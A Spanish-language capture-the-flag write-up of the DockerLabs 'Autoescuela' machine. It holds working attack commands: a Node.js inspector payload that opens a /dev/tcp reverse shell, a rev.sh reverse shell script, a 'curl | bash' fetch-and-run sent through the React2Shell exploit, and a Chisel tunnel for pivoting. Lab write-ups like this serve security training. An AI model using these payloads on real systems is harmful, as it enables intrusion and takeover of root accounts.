# Autoescuela

## Resumen Ejecutivo

| Máquina | Autor | Categoría | Plataforma |
| :--- | :--- | :--- | :--- |
| Autoescuela | mikisbd | Easy | dockerlabs |

**Resumen:** La máquina Autoescuela expone una aplicación web Node.js con Express en el puerto 8080 y, de forma más crítica, el depurador remoto de Node.js en el puerto 9229, el cual se encuentra accesible sin ningún tipo de autenticación. Al conectarse directamente a dicho inspector mediante el cliente `node inspect`, fue posible ejecutar código JavaScript arbitrario en el contexto del proceso del servidor, lo que permitió lanzar un reverse shell como el usuario `webuser`. Una vez dentro del sistema, la enumeración de los procesos activos reveló la existencia de una aplicación Next.js interna escuchando únicamente en `127.0.0.1:3000`, completamente oculta al tráfico exterior. Para acceder a dicho servicio, se estableció un túnel reverso mediante Chisel, exponiendo el puerto 3000 en la máquina atacante. La inspección del servicio interno reveló un portal de administración vulnerable a la CVE conocida como React2Shell, que permite la ejecución remota de comandos aprovechando un fallo en el manejo de redirecciones del servidor de desarrollo de Next.js. Esta vulnerabilidad fue explotada para ejecutar un script de reverse shell alojado temporalmente en un servidor HTTP de Python, obteniendo así acceso como `root` y completando la cadena de compromiso completa de la máquina.

---

## Reconocimiento

### 1. Despliegue de la máquina

El proceso comienza desplegando la máquina vulnerable con el script proporcionado por DockerLabs:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ sudo bash auto_deploy.sh autoescuela.tar 
[sudo] password for ouba: 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

### 2. Escaneo de puertos con Nmap

Se realiza un escaneo completo de todos los puertos TCP para identificar los servicios expuestos:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-21 20:01 WIB
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Autoescuela Hackcar - Inicio
9229/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html; charset=UTF-8
|_    WebSockets request was expected
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9229-TCP:V=7.95%I=7%D=7/21%Time=6A5F6DD1%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,65,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/html;\x20charset=UTF-8\r\n\r\nWebSockets\x20request\x20was\x20expecte
SF:d\r\n")%r(HTTPOptions,65,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/html;\x20charset=UTF-8\r\n\r\nWebSockets\x20request\x20w
SF:as\x20expected\r\n")%r(RTSPRequest,65,"HTTP/1\.0\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\n\r\nWebSockets\x2
SF:0request\x20was\x20expected\r\n")%r(RPCCheck,65,"HTTP/1\.0\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\n\r\nWeb
SF:Sockets\x20request\x20was\x20expected\r\n")%r(DNSVersionBindReqTCP,65,"
SF:HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html;\x20ch
SF:arset=UTF-8\r\n\r\nWebSockets\x20request\x20was\x20expected\r\n")%r(DNS
SF:StatusRequestTCP,65,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/html;\x20charset=UTF-8\r\n\r\nWebSockets\x20request\x20was\x2
SF:0expected\r\n")%r(Help,65,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/html;\x20charset=UTF-8\r\n\r\nWebSockets\x20request\x20
SF:was\x20expected\r\n")%r(SSLSessionReq,65,"HTTP/1\.0\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\n\r\nWebSockets
SF:\x20request\x20was\x20expected\r\n")%r(TerminalServerCookie,65,"HTTP/1\
SF:.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html;\x20charset=U
SF:TF-8\r\n\r\nWebSockets\x20request\x20was\x20expected\r\n")%r(TLSSession
SF:Req,65,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/htm
SF:l;\x20charset=UTF-8\r\n\r\nWebSockets\x20request\x20was\x20expected\r\n
SF:")%r(Kerberos,65,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/html;\x20charset=UTF-8\r\n\r\nWebSockets\x20request\x20was\x20ex
SF:pected\r\n")%r(SMBProgNeg,65,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/html;\x20charset=UTF-8\r\n\r\nWebSockets\x20request\
SF:x20was\x20expected\r\n")%r(X11Probe,65,"HTTP/1\.0\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\n\r\nWebSockets\x
SF:20request\x20was\x20expected\r\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```

El escaneo revela dos puertos abiertos de interés inmediato. El puerto `8080` aloja una aplicación web Node.js con Express identificada como "Autoescuela Hackcar". El puerto `9229` corresponde al inspector remoto de Node.js, el cual responde con `WebSockets request was expected`, un indicador inequívoco de que el debugger de Node.js está expuesto públicamente sin restricción de acceso. Esto representa un vector de ataque crítico.

---

## Acceso Inicial: Explotación del Inspector Remoto de Node.js (Puerto 9229)

### 3. Preparación del listener

Antes de conectarse al inspector, se prepara un listener en netcat para recibir la conexión de shell reverso:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

### 4. Ejecución de código remoto mediante Node Inspector

Con el listener activo, se conecta directamente al inspector de Node.js expuesto y se ejecuta un payload JavaScript que invoca `child_process` para lanzar un bash reverso hacia la máquina atacante:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ node inspect 172.17.0.2:9229
connecting to 172.17.0.2:9229 ... ok
debug> exec("process.mainModule.require('child_process').exec('/bin/bash -c \"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\"')")
{ _events: Object,
  _eventsCount: 2,
  _maxListeners: 'undefined',
  _closesNeeded: 3,
  _closesGot: 0,
  ... }
```

### 5. Recepción de la shell y estabilización del TTY

El listener recibe la conexión entrante como el usuario `webuser`. Acto seguido, se estabiliza el terminal para disponer de una experiencia de shell completamente interactiva:

```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 43716
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
webuser@07285777185d:/root/react_app$ id;whoami;hostname
id;whoami;hostname
uid=1001(webuser) gid=1001(webuser) groups=1001(webuser)
webuser
07285777185d
```

```bash
webuser@07285777185d:/root/react_app$ which script
which script
/usr/bin/script
webuser@07285777185d:/root/react_app$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
webuser@07285777185d:/root/react_app$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                  
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ stty raw -echo; fg      
[1]  + continued  nc -lvnp 4444

webuser@07285777185d:/root/react_app$ export TERM=xterm
webuser@07285777185d:/root/react_app$ export SHELL=/bin/bash
```

### 6. Captura de la flag de usuario

Se navega al directorio home de `webuser` y se obtiene la primera flag:

```bash
webuser@07285777185d:/root/react_app$ cd
webuser@07285777185d:~$ ls -la
total 36
drwxr-x--- 1 webuser webuser 4096 Jul 22 03:44 .
drwxr-xr-x 1 root    root    4096 Apr  1 05:33 ..
-rw------- 1 webuser webuser    3 Jul 22 03:44 .bash_history
-rw-r--r-- 1 webuser webuser  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 webuser webuser 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 webuser webuser  807 Mar 31  2024 .profile
drwxr-xr-x 1 webuser webuser 4096 Apr  3 05:17 node_app
-rw-r--r-- 1 webuser webuser   25 Apr  1 05:33 user.txt
webuser@07285777185d:~$ cat user.txt 
DL{g2Q[REDACTED]}
```

---

## Enumeración Interna y Pivoting

### 7. Descubrimiento de servicios internos

Con acceso al sistema, se inicia la enumeración de los servicios activos para identificar vectores adicionales:

```bash
webuser@07285777185d:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      11/node             
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9229            0.0.0.0:*               LISTEN      11/node             
webuser@07285777185d:~$ ps aux | grep "root"
root           1  0.0  0.0   4332  1900 ?        Ss   03:31   0:00 /bin/bash /entrypoint.sh /bin/sh -c tail -f /dev/null
root           8  0.0  0.1  11272  3892 ?        S    03:31   0:00 sudo -u webuser node --inspect=0.0.0.0:9229 /home/webuser/node_app/app.js
root           9  0.1  2.2 1209684 86372 ?       Sl   03:31   0:02 npm exec next dev -p 3000 -H 127.0.0.1
root          10  0.0  0.0   2736   964 ?        S    03:31   0:00 tail -f /dev/null
root          30  0.0  0.0   2808   952 ?        S    03:31   0:00 sh -c next dev -p 3000 -H 127.0.0.1
root          31  0.1  2.1 11627416 83264 ?      Sl   03:31   0:01 node /root/react_app/node_modules/.bin/next dev -p 3000 -H 127.0.0.1
root          43  0.4  4.8 34370520 183416 ?     Sl   03:31   0:04 next-server (v15.0.0-rc.1)
webuser      109  0.0  0.0   3964  2276 pts/0    S+   03:50   0:00 grep --color=auto root
```

La enumeración revela un hallazgo de alto valor: el puerto `3000` está a la escucha únicamente en `127.0.0.1`, y el proceso propietario es ejecutado por `root`. Se trata de un servidor Next.js en modo desarrollo (`next dev`), versión `15.0.0-rc.1`. Al estar vinculado exclusivamente a la interfaz local, no es accesible desde el exterior de forma directa, por lo que se hace necesario establecer un túnel.

### 8. Configuración del túnel reverso con Chisel

Se inicia el servidor Chisel en la máquina atacante con soporte para tunneling reverso:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ ./chisel server --reverse -p 8000
2026/07/22 10:59:02 server: Reverse tunnelling enabled
2026/07/22 10:59:02 server: Fingerprint yjwN9dfmUDMG7gjseSbvRVtR6SeXVM9OLKbrj/+cOs8=
2026/07/22 10:59:02 server: Listening on http://0.0.0.0:8000
```

Se sirve el binario de Chisel a la máquina víctima mediante un servidor HTTP temporal:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
172.17.0.2 - - [22/Jul/2026 11:01:59] "GET /chisel HTTP/1.1" 200 -
```

Desde la máquina víctima, se descarga y se otorgan permisos de ejecución al binario:

```bash
webuser@07285777185d:/tmp$ curl -o /tmp/chisel http://172.17.0.1:9999/chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8736k  100 8736k    0     0  93.7M      0 --:--:-- --:--:-- --:--:-- 94.7M
webuser@07285777185d:/tmp$ chmod +x /tmp/chisel
```

Se lanza el cliente Chisel en la víctima para establecer el túnel reverso del puerto `3000`:

```bash
webuser@07285777185d:/tmp$ /tmp/chisel client 172.17.0.1:8000 R:3000:127.0.0.1:3000 &
[1] 153
webuser@07285777185d:/tmp$ 2026/07/22 04:05:32 client: Connecting to ws://172.17.0.1:8000
2026/07/22 04:05:32 client: Connected (Latency 610µs)
```

### 9. Verificación del servicio interno tuneado

Se confirma que el puerto `3000` está ahora accesible desde la máquina atacante realizando un escaneo Nmap contra localhost:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ nmap -sC -sV -p 3000 -T4 localhost
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-22 11:07 WIB
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000058s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     content-type: text/html
|     Date: Wed, 22 Jul 2026 04:07:24 GMT
|     Connection: close
|     <div style="font-family: sans-serif; padding: 40px; background-color: #f9f9fb; min-height: 100vh; display: flex; justify-content: center; align-items: center;">
|     <div style="padding: 40px; border: 1px solid #e1e4e8; border-radius: 12px; background-color: #fff; box-shadow: 0 4px 6px rgba(0,0,0,0.05); max-width: 600px; width: 100%;">
|     style="color: #24292e; margin-top: 0;">Internal Administration Portal</h1>
|     <div style="padding: 20px 0; border-top: 1px solid #eee; border-bottom: 1px solid #eee; margin: 20px 0;">
|     style="color: #586069;"><strong>System Status:</strong> <span style="color: #28a745;">
|     Operational</span></p>
|     style="color: #586069;"><stro
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     allow: GET, HEAD, OPTIONS, POST
|     Date: Wed, 22 Jul 2026 04:07:24 GMT
|     Connection: close
|   Help, NCP: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=7/22%Time=6A6041FC%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,5D3,"HTTP/1\.1\x20200\x20OK\r\nvary:\x20RSC,\x20Next-Router-St
SF:ate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch\r\nc
SF:ontent-type:\x20text/html\r\nDate:\x20Wed,\x2022\x20Jul\x202026\x2004:0
SF:7:24\x20GMT\r\nConnection:\x20close\r\n\r\n\n\x20\x20\x20\x20<div\x20st
SF:yle=\"font-family:\x20sans-serif;\x20padding:\x2040px;\x20background-co
SF:lor:\x20#f9f9fb;\x20min-height:\x20100vh;\x20display:\x20flex;\x20justi
SF:fy-content:\x20center;\x20align-items:\x20center;\"\x20>\n\x20\x20\x20\x20\
SF:x20\x20<div\x20style=\"padding:\x2040px;\x20border:\x201px\x20solid\x20
SF:#e1e4e8;\x20border-radius:\x2012px;\x20background-color:\x20#fff;\x20bo
SF:x-shadow:\x200\x204px\x206px\x20rgba\(0,0,0,0\.05\);\x20max-width:\x206
SF:00px;\x20width:\x20100%;\"\x20>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20sty
SF:le=\"color:\x20#24292e;\x20margin-top:\x200;\"\x20>Internal\x20Administrati
SF:on\x20Portal</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\"padd
SF:ing:\x2020px\x200;\x20border-top:\x201px\x20solid\x20#eee;\x20border-bo
SF:ttom:\x201px\x20solid\x20#eee;\x20margin:\x2020px\x200;\"\x20>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<p\x20style=\"color:\x20#586069;\"\x20><strong
SF:>System\x20Status:</strong>\x20<span\x20style=\"color:\x20#28a745;\"\x20>\x
SF:e2\x97\x8f\x20Operational</span></p>\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20<p\x20style=\"color:\x20#586069;\"\x20><stro")%r(Help,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HT
SF:TPOptions,CB,"HTTP/1\.1\x20204\x20No\x20Content\r\nvary:\x20RSC,\x20Nex
SF:t-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Pr
SF:efetch\r\nallow:\x20GET,\x20HEAD,\x20OPTIONS,\x20POST\r\nDate:\x20Wed,\
SF:x2022\x20Jul\x202026\x2004:07:24\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:")%r(RTSPRequest,CB,"HTTP/1\.1\x20204\x20No\x20Content\r\nvary:\x20RSC,
SF:\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Seg
SF:ment-Prefetch\r\nallow:\x20GET,\x20HEAD,\x20OPTIONS,\x20POST\r\nDate:\x
SF:20Wed,\x2022\x20Jul\x202026\x2004:07:24\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds
```

La respuesta HTTP del servicio revela que se trata de un "Internal Administration Portal" construido con Next.js. Esto, combinado con la versión `15.0.0-rc.1` observada en los procesos, apunta directamente a la vulnerabilidad React2Shell.

---

## Escalada de Privilegios: CVE React2Shell en Next.js

### 10. Clonación del exploit React2Shell

Se clona el repositorio del exploit que aprovecha una vulnerabilidad en el servidor de desarrollo de Next.js para lograr ejecución remota de comandos:

```bash
┌──(venv)─(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ git clone https://github.com/freeqaz/react2shell.git              
Cloning into 'react2shell'...
remote: Enumerating objects: 82, done.
remote: Counting objects: 100% (82/82), done.
remote: Compressing objects: 100% (65/65), done.
remote: Total 82 (delta 24), reused 74 (delta 16), pack-reused 0 (from 0)
Receiving objects: 100% (82/82), 126.12 KiB | 1.30 MiB/s, done.
Resolving deltas: 100% (24/24), done.
```

### 11. Verificación de la vulnerabilidad

Antes de lanzar el payload de reverse shell, se verifica que el objetivo es efectivamente vulnerable ejecutando el comando `id`:

```bash
┌──(venv)─(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ cd react2shell        
                                                                                                                   
┌──(venv)─(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/react2shell]
└─$ ./exploit-redirect.sh http://localhost:3000 "id"
[*] React2Shell Exploit - redirect exfil mode
[*] Target: http://localhost:3000
[*] Command: id

[+] HTTP 500 - Redirect exfil successful
[+] Command output:
----------------------------------------
▒Z ▒/login?a=dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCk=;307;
----------------------------------------
                                                                                                                   
┌──(venv)─(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/react2shell]
└─$ echo 'dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCk=' | base64 -d
uid=0(root) gid=0(root) groups=0(root)            
```

El resultado, codificado en Base64 dentro del parámetro de redirección, confirma que los comandos se ejecutan con privilegios de `root`. La explotación es un éxito confirmado.

### 12. Preparación del listener y del payload de reverse shell

Se prepara un nuevo listener en netcat para recibir la shell de root:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

Se crea el script de reverse shell y se sirve mediante un servidor HTTP temporal:

```bash
┌──(venv)─(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/react2shell]
└─$ vim rev.sh 
                                                                                                                   
┌──(venv)─(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/react2shell]
└─$ cat rev.sh 
#!/bin/bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/1337 0>&1"
                                                                                                                   
┌──(venv)─(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/react2shell]
└─$ python3 -m http.server 3333                                                                            
Serving HTTP on 0.0.0.0 port 3333 (http://0.0.0.0:3333/) ...
```

### 13. Ejecución del payload

Se lanza el exploit indicando como comando la descarga y ejecución del script de reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/react2shell]
└─$ ./exploit-redirect.sh http://localhost:3000 "curl http://172.17.0.1:3333/rev.sh | bash"
[*] React2Shell Exploit - redirect exfil mode
[*] Target: http://localhost:3000
[*] Command: curl http://172.17.0.1:3333/rev.sh | bash
```

El servidor HTTP confirma que el objetivo descargó el script correctamente:

```bash
172.17.0.2 - - [22/Jul/2026 11:30:53] "GET /rev.sh HTTP/1.1" 200 -
```

### 14. Recepción de la shell root y estabilización del TTY

El listener recibe la conexión entrante como `root`. Se estabiliza el terminal de inmediato:

```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39038
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@07285777185d:~/react_app# script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
root@07285777185d:~/react_app# ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                   
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337

root@07285777185d:~/react_app# export SHELL=/bin/bash
root@07285777185d:~/react_app# export TERM=xterm
root@07285777185d:~/react_app# stty rows 80 cols 150
```

### 15. Captura de la flag de root

Se navega al directorio home de root y se obtiene la flag final:

```bash
root@07285777185d:~/react_app# cd ..
root@07285777185d:~# ls -la
total 36
drwx------ 1 root root 4096 Apr  3 05:17 .
drwxr-xr-x 1 root root 4096 Jul 22 03:31 ..
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
drwxr-xr-x 1 root root 4096 Apr  3 05:17 .npm
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwxr-xr-x 1 root root 4096 Jul 22 03:31 react_app
-r-------- 1 root root   25 Apr  1 05:33 root.txt
root@07285777185d:~# cat root.txt 
DL{Z8G[REDACTED]}
root@07285777185d:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
07285777185d
```

---

## Resumen de la Cadena de Ataque

1. **Reconocimiento:** El escaneo Nmap completo sobre la IP `172.17.0.2` reveló dos servicios críticos: la aplicación web en el puerto `8080` y el inspector remoto de Node.js sin autenticación en el puerto `9229`.

2. **Descubrimiento de la vulnerabilidad:** El puerto `9229` correspondía al debugger de Node.js expuesto a la red pública. Esta configuración insegura, resultado de usar el flag `--inspect=0.0.0.0`, permitía a cualquier cliente conectarse y ejecutar JavaScript arbitrario en el contexto del servidor.

3. **Explotación inicial:** Mediante el cliente `node inspect`, se ejecutó un payload JavaScript que invocó `child_process.exec` para lanzar un reverse bash shell, obteniendo acceso como `webuser` sobre el contenedor.

4. **Enumeración interna:** El análisis de procesos activos con `ps aux` y de conexiones con `netstat` reveló la existencia de un servidor Next.js en modo de desarrollo, ejecutado por `root` y accesible únicamente desde `127.0.0.1:3000`. Para acceder a este servicio oculto, se transfirió el binario Chisel a la víctima mediante un servidor HTTP temporal y se estableció un túnel reverso hacia el puerto local de la máquina atacante.

5. **Escalada de privilegios:** El portal interno en el puerto `3000` ejecutaba Next.js v15.0.0-rc.1, una versión susceptible a la vulnerabilidad React2Shell. Este exploit aprovecha un fallo en el manejo de redirecciones del servidor de desarrollo, exfiltrando la salida de comandos en Base64 dentro de la URL de redirección. Tras confirmar la ejecución como `root` con el comando `id`, se entregó un payload de curl mediante el exploit para descargar y ejecutar un script de reverse shell alojado en la máquina atacante, obteniendo así una shell interactiva con privilegios de superusuario y capturando la flag final.
